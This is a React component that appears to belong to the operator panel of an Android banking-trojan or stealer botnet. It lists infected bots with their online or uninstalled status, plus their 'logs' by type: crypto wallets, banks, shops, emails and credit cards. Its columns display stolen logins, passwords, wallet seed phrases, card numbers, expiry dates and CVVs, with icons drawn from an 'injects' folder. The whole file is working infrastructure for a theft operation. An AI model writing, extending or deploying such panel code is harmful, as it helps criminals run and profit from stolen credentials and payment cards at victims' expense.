import React, {useState} from "react";
import {BotLog} from "../../Model/BotLog";
import {AppstoreOutlined, DatabaseOutlined, DeleteFilled, EditFilled, OrderedListOutlined} from "@ant-design/icons";
import {Button, Popconfirm, Radio, RadioChangeEvent, Space, Table, Tag} from "antd";
import {logTypeHasImage} from "../../Util/logTypeHasImage";
import {AppState} from "../../Store/RootReducer";
import {setLogsPage} from "../../Store/Logs/Actions";
import {scrollToTop} from "../../Util/scrollToTop";
import {ColumnType, Key} from "antd/es/table/interface";
import LogsFilter from "./LogsFilter";
import LogComment from "../Modals/LogComment/LogComment";
import DeleteLogModal from "../Modals/DeleteLog/DeleteLogModal";
import JsonLogDataToTemplate from "./JsonLogDataToTemplate";
import {hasAccess} from "../../Util/hasAccess";
import {BotLogsPageRenderProps} from "./BotLogsPageRender";
import {useTranslation} from "react-i18next";
import Spinner from "./Spinner";
import BotLogsCard from "./BotLogsCard";
import {useAppDispatch} from "../../Hook/useAppDispatch";
import {useAppSelector} from "../../Hook/useAppSelector";
import moment from "moment";
import {NavLink} from "react-router-dom";

export type logsType = "crypt" | "credit_cards" | "banks" | "stealers" | "wallets" | "emails" | "shops";

interface BotLogsTableProps extends BotLogsPageRenderProps {
    logs: BotLog[],
    isLoaded: boolean,
    filters: boolean,
}

interface BotLogsColumns<T> extends ColumnType<T> {
    isVisible?: boolean,
}

const BotLogsTable: React.FC<BotLogsTableProps> = (props: BotLogsTableProps) => {
    const [logIds, setLogIds] = useState<number[]>([]);
    const [deleteModal, setDeleteModal] = useState(false);
    const [logComment, setLogComment] = useState(false);
    const dispatch = useAppDispatch();
    const [renderType, setRenderType] = useState("cards");

    const authReducer = useAppSelector((state: AppState) => state.auth);

    const {t} = useTranslation();

    // @ts-ignore
    const columns: BotLogsColumns<BotLog>[] = [
        {
            title: "# ID",
            dataIndex: "id",
            key: "id",
            width: 30,
            sorter: true,
            sortDirections: ["ascend", "descend", "ascend"],
            render: (text: string) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>ID</h3>
                    </div>
                    <div className="table-col-item" style={{textAlign: "center"}}>
                        {text}
                    </div>
                </div>
            ),
            isVisible: true,
        },
        {
            title: (
                <>
                    <i className="fa-brands fa-android"/> {t("LOG_COLUMN_BOT_ID")}
                </>
            ),
            dataIndex: "bot_id",
            key: "bot_id",
            width: 300,
            sorter: true,
            sortDirections: ["ascend", "descend", "ascend"],
            render: (text: string, log: BotLog) => {
                const lastConnectionDiff = moment().diff(moment(log.bot?.updated_at)) / 1000;
                const lastConnectionStatus = lastConnectionDiff <= 60 ? "online" : (lastConnectionDiff >= 144000 ? "uninstalled": "offline");

                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("LOG_COLUMN_BOT_ID")}</h3>
                        </div>
                        <div className="table-col-item">
                            <div className="inject-bot-info">
                                <div>
                                    <NavLink
                                        to={`/bots?bot_ids=${log.bot_id}`}
                                    >
                                        {log.bot_id}
                                    </NavLink>
                                </div>
                                <Space>
                                    <span className={"inject-bot-status " + lastConnectionStatus}>
                                        {lastConnectionStatus}
                                    </span>
                                    <Tag className={"bot-item-tag"}>
                                        {log.bot?.tag}
                                    </Tag>
                                </Space>
                            </div>
                            {log.comment && (
                                <div className="log-comment">
                                    <Space>
                                        <i className="fa-regular fa-message"/>
                                        <span>
                                            {t("COMMENT")}: {log.comment}
                                        </span>
                                    </Space>
                                </div>
                            )}
                        </div>
                    </div>
                );
            },
            isVisible: true,
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-terminal"/> {t("LOG_COLUMN_APP")}
                </>
            ),
            dataIndex: "application",
            key: "application",
            sorter: true,
            sortDirections: ["ascend", "descend", "ascend"],
            render: (application: string, log: BotLog) => (
                <>
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("LOG_COLUMN_APP")}</h3>
                        </div>
                        <div className="table-col-item">
                            <Space size={5}>
                                {logTypeHasImage(log.type) && (
                                    <div
                                        style={{
                                            backgroundImage: `url(/injects/images/${log.type === "stealers" ? "crypt" : log.type}/${application}.png)`,
                                        }}
                                        className="app-icon"
                                    />
                                )}
                                {application}
                            </Space>
                        </div>
                    </div>
                </>
            ),
            isVisible: true,
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-user-tag"/> {t("LOG_COLUMN_LOGIN")}
                </>
            ),
            dataIndex: "login",
            key: "login",
            render: (text: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_LOGIN")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.login as string|null) ?? "-"}
                    </div>
                </div>
            ),
            isVisible: ["crypt", "banks", "shops", "wallets"].includes(props.type),
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-envelope"/> {t("LOG_COLUMN_EMAIL")}
                </>
            ),
            dataIndex: "email",
            key: "email",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_EMAIL")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.email as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "emails",
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-key"/> {t("LOG_COLUMN_PASSWORD")}
                </>
            ),
            dataIndex: "password",
            key: "password",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_PASSWORD")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.password as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: ["crypt", "banks", "shops", "wallets"].includes(props.type),
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-user"/> {t("LOG_COLUMN_NAME")}
                </>
            ),
            dataIndex: "name",
            key: "name",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_NAME")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.name as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "emails",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-user"/> {t("LOG_COLUMN_SURNAME")}
                </>
            ),
            dataIndex: "surname",
            key: "surname",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_SURNAME")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.surname as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "emails",
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-align-center"/> {t("LOG_COLUMN_BACKUP")}
                </>
            ),
            dataIndex: "backupPhrase",
            key: "backupPhrase",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_BACKUP")}</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.backupPhrase ? (
                            <span className="seed_phrase">{(log.log.backupPhrase as string|null)}</span>
                        ) : (
                            "-"
                        )}
                    </div>
                </div>,
            isVisible: props.type === "crypt",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-credit-card"/> {t("LOG_COLUMN_CARD_NUMBER")}
                </>
            ),
            dataIndex: "cardNumber",
            key: "cardNumber",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_CARD_NUMBER")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.cardNumber as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-user"/> {t("LOG_COLUMN_HOLDER")}
                </>
            ),
            dataIndex: "holderName",
            key: "holderName",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_HOLDER")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.holderName as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-user"/> {t("LOG_COLUMN_LAST_NAME")}
                </>
            ),
            dataIndex: "lastName",
            key: "lastName",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_LAST_NAME")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.lastName as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-credit-card"/> {t("LOG_COLUMN_EXP")}
                </>
            ),
            dataIndex: "exp",
            key: "exp",
            render: (text: string, log: BotLog) => {
                const expMM = log.log["expMM"] ?? undefined;
                const expYY = log.log["expYY"] ?? undefined;
                const exp = log.log["exp"] ? log.log["exp"] : (expMM && expYY ? `${expMM}/${expYY}` : "-");

                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <h3>{t("LOG_COLUMN_EXP")}</h3>
                        </div>
                        <div className="table-col-item">
                            {(exp as string)}
                        </div>
                    </div>
                );
            },
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-credit-card"/> {t("LOG_COLUMN_CVV")}
                </>
            ),
            dataIndex: "CVV",
            key: "cvv",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_CVV")}</h3>
                    </div>
                    <div className="table-col-item">
                        {(log.log.CVV as string|null) ?? "-"}
                    </div>
                </div>,
            isVisible: props.type === "credit_cards",
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-bars"/> {t("LOG_COLUMN_ADDITIONAL")}
                </>
            ),
            dataIndex: "additional",
            key: "additional",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_ADDITIONAL")}</h3>
                    </div>
                    <div className="table-col-item">
                        {log.log.additional ? <JsonLogDataToTemplate log={log.log.additional}/> : "-"}
                    </div>
                </div>,
            isVisible: ["crypt", "banks", "credit_cards"].includes(props.type),
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-align-center"/> {t("LOG_COLUMN_SEED")}
                </>
            ),
            dataIndex: "phrase",
            key: "phrase",
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_SEED")}</h3>
                    </div>
                    <div className="table-col-item">
                        <span className="seed_phrase">
                            {(log.log.phrase as string|null) ?? "-"}
                        </span>
                    </div>
                </div>,
            isVisible: props.type === "stealers",
        },
        {
            title: (
                <>
                    <i className="fa-regular fa-calendar-days"/> {t("LOG_COLUMN_CREATED")}
                </>
            ),
            dataIndex: "created_at",
            key: "created_at",
            sorter: true,
            defaultSortOrder: "descend",
            sortDirections: ["ascend", "descend", "ascend"],
            render: (text: string, log: BotLog) =>
                <div className="table-col">
                    <div className="table-col-item">
                        <h3>{t("LOG_COLUMN_CREATED")}</h3>
                    </div>
                    <div className="table-col-item">
                        {log.created_at}

                        <div className="log_actions">
                            <Space size="small">
                                {hasAccess(authReducer.user, props.type + ".editComment") && (
                                    <Button
                                        type="primary"
                                        icon={<EditFilled/>}
                                        onClick={() => {
                                            setLogIds([log.id]);
                                            setLogComment(true);
                                        }}
                                    >
                                        {t("COMMENT")}
                                    </Button>
                                )}

                                {hasAccess(authReducer.user, props.type + ".delete") && (
                                    <Button
                                        type="primary"
                                        icon={<DeleteFilled/>}
                                        danger
                                        onClick={() => {
                                            setLogIds([log.id]);
                                            setDeleteModal(true);
                                        }}
                                    />
                                )}
                            </Space>
                        </div>
                    </div>
                </div>,
            isVisible: true,
        },
    ];

    const selectedChange = (selectedLogIds: Key[]) => {
        setLogIds(selectedLogIds.map((key: Key) => key as number));
    };

    const rowSelection = {
        selectedRowKeys: logIds as Key[],
        onChange: selectedChange,
    };

    const logsReducer = useAppSelector((state: AppState) => state.logs);

    const logsPaginationHandler = (pageNumber: number, size: number) => {
        if (logsReducer.isLoaded &&
            logsReducer.page === logsReducer.loaded_page &&
            logsReducer.page === logsReducer.loaded_page &&
            logsReducer.loaded_per_page === logsReducer.per_page) {
            scrollToTop();
            dispatch(setLogsPage(pageNumber, size));
        }
    };

    const changeRenderType = (e: RadioChangeEvent) => {
        setRenderType(e.target.value);
    };

    return (
        <>
            <div className="panel-header">
                <h2 className="panel-title">{props.title}</h2>
            </div>

            <>
                {(hasAccess(authReducer.user, props.type + ".editComment") || hasAccess(authReducer.user, props.type + ".delete")) && (
                    <div className="affix-custom">
                        <div className="bots-actions">
                            <Space>
                                <Popconfirm
                                    title={props.filters && <LogsFilter logsType={props.type}/>}
                                    placement="bottomLeft"
                                    icon={null}
                                    className="pop-filter"
                                    cancelText={t("MODAL_BUTTON_CANCEL")}
                                >
                                    <Button icon={<OrderedListOutlined/>} type="primary">
                                        {t("FILTERS_BTN")}
                                    </Button>
                                </Popconfirm>

                                <Radio.Group
                                    value={renderType}
                                    onChange={changeRenderType}
                                    optionType="button"
                                    buttonStyle="solid"
                                >
                                    <Radio.Button value="table"><DatabaseOutlined/></Radio.Button>
                                    <Radio.Button value="cards"><AppstoreOutlined/></Radio.Button>
                                </Radio.Group>

                                {hasAccess(authReducer.user, props.type + ".editComment") && (
                                    <Button
                                        type="primary"
                                        icon={<EditFilled/>}
                                        disabled={logIds.length === 0}
                                        onClick={() => {
                                            setLogComment(true);
                                        }}
                                    >
                                        {t("COMMENT")}
                                    </Button>
                                )}

                                {hasAccess(authReducer.user, props.type + ".delete") && (
                                    <Button
                                        type="primary"
                                        icon={<DeleteFilled/>}
                                        disabled={logIds.length === 0}
                                        danger={true}
                                        onClick={() => {
                                            setDeleteModal(true);
                                        }}
                                    />
                                )}
                            </Space>
                        </div>
                    </div>
                )}

                <div className="panel-content">
                    {renderType === "cards" ? (
                        <BotLogsCard
                            log={props.logs}
                            comment={logComment}
                            setComment={setLogComment}
                            delete={deleteModal}
                            setDelete={setDeleteModal}
                            logIds={logIds}
                            setLogIds={setLogIds}
                            selectedChange={selectedChange}
                            paginationHandler={logsPaginationHandler}
                            isLoaded={props.isLoaded}
                        />
                    ) : (
                        <Table
                            columns={columns.filter((column) => column.isVisible)}
                            dataSource={props.logs}
                            size="large"
                            loading={{
                                spinning: !props.isLoaded,
                                indicator: <Spinner preloader={true}/>,
                            }}
                            pagination={{
                                current: logsReducer.page,
                                total: logsReducer.total,
                                defaultPageSize: logsReducer.per_page,
                                onChange: logsPaginationHandler,
                                position: ["topLeft", "bottomLeft"],
                                showSizeChanger: true,
                                locale: {
                                    items_per_page: "",
                                },
                                pageSizeOptions: [4, 8, 16, 32, 64],
                            }}
                            rowKey="id"
                            showSorterTooltip={false}
                            rowSelection={rowSelection}
                            className="log-table"
                            locale={{
                                emptyText: (
                                    <Space>
                                        <i className="fa-solid fa-robot"/> {t("TABLE_EMPTY")}
                                    </Space>
                                ),
                            }}
                        />
                    )}
                    <br/>
                    {/* {props.pagination && props.paginationComponent}*/}
                </div>
            </>


            <LogComment logIds={logIds} visible={logComment} setVisible={setLogComment}/>

            <DeleteLogModal logIds={logIds} visible={deleteModal} setVisible={setDeleteModal}/>
        </>
    );
};

export default BotLogsTable;
